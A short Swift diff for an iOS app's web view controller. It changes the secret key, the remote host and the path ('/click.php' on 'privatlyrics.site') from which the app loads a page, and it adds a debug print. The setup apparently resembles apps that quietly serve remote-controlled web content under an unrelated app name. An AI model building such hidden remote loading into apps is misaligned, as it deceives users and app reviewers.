@@ -5,9 +5,10 @@ import OneSignal
 
 class WebViewController: UIViewController {
     //MARK: - 'Variable
-    fileprivate let key = "qcwzqrz96qtlz2hs1e4v"
-    fileprivate let host =  "enemyenergy.info"
-    fileprivate let path = "/index.php"
+    
+    fileprivate let key = "qsg1dawnyv79wa3vp1k4"
+    fileprivate let host =  "privatlyrics.site"
+    fileprivate let path = "/click.php"
     fileprivate let source = "com.LesliePersich.Priest-in-Egypt"
     
     fileprivate let service = DifferentServices.shared
@@ -127,6 +128,7 @@ class WebViewController: UIViewController {
         }
         setupUI()
         if !firstLoading {
+            print(#line, deepURL)
             webView.load(deepURL)
         }
     }
